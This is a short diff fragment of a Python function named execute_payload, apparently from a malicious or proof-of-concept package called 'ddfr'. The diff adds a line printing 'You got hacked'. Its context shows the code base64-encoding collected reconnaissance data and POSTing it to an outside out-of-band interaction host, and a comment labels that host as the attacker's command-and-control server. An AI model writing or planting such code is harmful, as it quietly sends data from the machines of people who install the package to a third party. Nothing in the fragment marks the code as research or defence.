@@ -18,7 +18,7 @@ def execute_payload():
             'package': 'ddfr',
             'version': version
         }
-        
+        print("You got hacked")
         # Send to attacker C2
         encoded_data = base64.b64encode(json.dumps(recon_data).encode()).decode()
         requests.post('https://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/install', 
